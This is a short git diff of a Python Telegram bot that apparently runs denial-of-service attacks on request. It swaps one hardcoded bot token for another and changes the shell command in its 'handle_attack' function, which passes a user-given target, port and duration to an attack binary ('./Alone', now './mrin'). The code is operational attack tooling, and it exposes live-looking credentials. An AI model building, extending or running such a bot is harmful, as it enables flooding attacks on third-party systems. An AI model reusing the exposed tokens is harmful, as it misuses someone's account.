@@ -12,7 +12,7 @@ from io import BytesIO
 from telebot import types
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8112431515:AAFuESYE6F5lspagyZTNlECzZeJJUy70wy4')
+bot = telebot.TeleBot('8112431515:AAFbmO-IHlWiNy594F6H8SO2ZVFbqwXjYtw')
 
 # Admin user IDs
 admin_id = ["6539807903"]
@@ -198,7 +198,7 @@ def handle_attack(message):
     save_users()
 
     # Crafting the attack command
-    full_command = f"./Alone {target} {port} {time_duration} 900"
+    full_command = f"./mrin {target} {port} {time_duration} 512 750"
 
     # Attempting to run the attack
     try:
